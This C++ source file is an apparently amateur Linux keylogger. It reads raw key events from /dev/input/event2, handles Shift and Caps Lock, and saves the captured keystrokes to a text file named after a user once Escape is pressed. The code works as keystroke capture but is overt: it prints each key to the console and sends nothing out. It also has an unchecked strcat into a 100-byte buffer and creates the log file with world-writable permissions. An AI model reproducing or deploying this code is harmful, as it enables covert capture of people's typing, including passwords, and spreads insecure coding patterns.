#include <iostream>
#define DEV_PATH "/dev/input/event2"
#include <stdio.h>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <errno.h>
#include <string.h>
#include <string>
#include <vector>
#include "key_logger.h"

int check(int result) {
    if (result >= 0)
        return result;


    perror(strerror(errno));
    exit(-1);
}
bool isLetter(const int value)
{
    if ((value >= 16 && value <= 25) || (value >= 30 && value <= 38) || (value >= 44 && value <= 50))
        return true;
    else
        return false;
}


int main()
{
    //check(chmod("/dev/input/event2", S_IROTH));
    Key_logger name_of_the_keys;
    int keys_fd; //дескриптор
    struct input_event t;
    struct input_event t_shift;
    keys_fd = check(open(DEV_PATH, O_RDONLY));
    char Name[100];
    std::cout << "Enter the name of the user >> ";
    std::cin >> Name;
    auto path = strcat(Name, ".txt");

    std::vector<const char*> names;
    bool flag_shift = false;
    bool flag_caps = false;
    if (keys_fd <= 0)
    {
        std::cout << "open/dev/input/event2 device error!" << std::endl;
        return 0;
    }
    while (true)
    {

        if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
        {
            if (t.type == EV_KEY)

                if (t.value == 0 || t.value == 1)
                {
                    if (t.code == 42 && t.value == 1)
                        flag_shift = true;
                    if (t.code == 42 && t.value == 0)
                        flag_shift = false;
                    if (t.code == 58 && t.value == 1)
                    {
                        std::cout << "Changed!" << std::endl;
                        flag_caps = !flag_caps;
                    }

                    if (t.value == 1 && isLetter(t.code))
                    {
                        if (flag_shift == true && flag_caps == false)
                        {
                            names.push_back(name_of_the_keys.get_name_of_the_key(t.code + 1000));
                            std::cout << "key1 " << name_of_the_keys.get_name_of_the_key(t.code + 1000) << std::endl;
                        }
                        else if (flag_caps == true && flag_shift == false)
                        {
                            names.push_back(name_of_the_keys.get_name_of_the_key(t.code + 1000));
                            std::cout << "key2 " << name_of_the_keys.get_name_of_the_key(t.code + 1000) << std::endl;
                        }
                        else
                        {
                            names.push_back(name_of_the_keys.get_name_of_the_key(t.code));
                            std::cout << "key3 " << name_of_the_keys.get_name_of_the_key(t.code) << std::endl;
                        }
                    }               
                    else if (t.value == 1 && !isLetter(t.code))
                    {
                        if (flag_shift == true)
                        {
                            names.push_back(name_of_the_keys.get_name_of_the_key(t.code + 1000));
                            std::cout << "key4 " << name_of_the_keys.get_name_of_the_key(t.code + 1000) << std::endl;
                        }
                        if (flag_shift == false)
                        {
                            names.push_back(name_of_the_keys.get_name_of_the_key(t.code));
                            std::cout << "key5 " << name_of_the_keys.get_name_of_the_key(t.code) << std::endl;
                        }
                    }
                }

                if (t.code == 1){
                    std::cout << t.code << std::endl;
                    std::cout << "Exit" << std::endl;
                    break;
                }
                
        }


    }
    close(keys_fd);
    
    auto d_save = check(open(path, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO));

    for (int i = 0; i < names.size(); ++i)
    {
        write(d_save, names[i], strlen(names[i]));
    }

    close(d_save);
    return 0;
}